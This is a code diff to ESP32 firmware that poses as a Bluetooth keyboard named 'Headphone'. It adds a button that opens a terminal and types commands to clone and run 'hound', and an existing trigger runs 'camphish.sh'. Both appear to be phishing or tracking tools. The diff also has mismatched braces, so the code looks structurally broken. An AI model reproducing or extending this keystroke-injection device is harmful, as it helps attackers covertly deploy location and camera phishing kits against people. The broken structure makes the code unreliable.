@@ -15,6 +15,7 @@
 #define BUTTON_11_PIN 24  // Trigger 11
 #define BUTTON_12_PIN 26  // Trigger 12
 #define BUTTON_13_PIN 28  // Trigger 13
+#define BUTTON_14_PIN 19  // Trigger 14
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -33,6 +34,7 @@ bool lastState10 = HIGH;
 bool lastState11 = HIGH;
 bool lastState12 = HIGH;
 bool lastState13 = HIGH;
+bool lastState14 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -66,6 +68,7 @@ void setup() {
   pinMode(BUTTON_11_PIN, INPUT_PULLUP);
   pinMode(BUTTON_12_PIN, INPUT_PULLUP);
   pinMode(BUTTON_13_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -85,6 +88,7 @@ void loop() {
     bool state11 = digitalRead(BUTTON_11_PIN);
     bool state12 = digitalRead(BUTTON_12_PIN);
     bool state13 = digitalRead(BUTTON_13_PIN);
+    bool state14 = digitalRead(BUTTON_14_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -441,7 +445,42 @@ void loop() {
     bleKeyboard.releaseAll();
 }
    const char* cmd = "bash camphish.sh";
-  sendString(cmd, 9);
+  sendString(cmd, 10);
+    delay(80);
+    bleKeyboard.press(KEY_RETURN);
+    delay(40);
+    bleKeyboard.releaseAll();
+}
+
+// Trigger 14:
+    if (lastState14 == HIGH && state14 == LOW) {
+      openRun();
+      delay(500);
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(200);
+      bleKeyboard.releaseAll();
+      delay(800);
+       const char* cmd = "git clone https://github.com/techchipnet/hound";
+      sendString(cmd, 9);
+      delay(80);
+      bleKeyboard.press(KEY_RETURN);
+      delay(40);
+      bleKeyboard.releaseAll();
+  }
+      const char* cmd = "cd hound";
+      for (size_t i = 0; i < strlen(cmd); ++i) {
+      bleKeyboard.print(cmd[i]);
+      delay(8);
+    }
+    delay(80);
+    bleKeyboard.press(KEY_RETURN);
+    delay(50);
+    bleKeyboard.releaseAll();
+}
+   const char* cmd = "bash hound.sh";
+  sendString(cmd, 10);
     delay(80);
     bleKeyboard.press(KEY_RETURN);
     delay(40);
@@ -462,6 +501,7 @@ void loop() {
     lastState11 = state11;
     lastState12 = state12;
     lastState13 = state13;
+    lastState14 = state14;
   }
 
   delay(10); // Small debounce
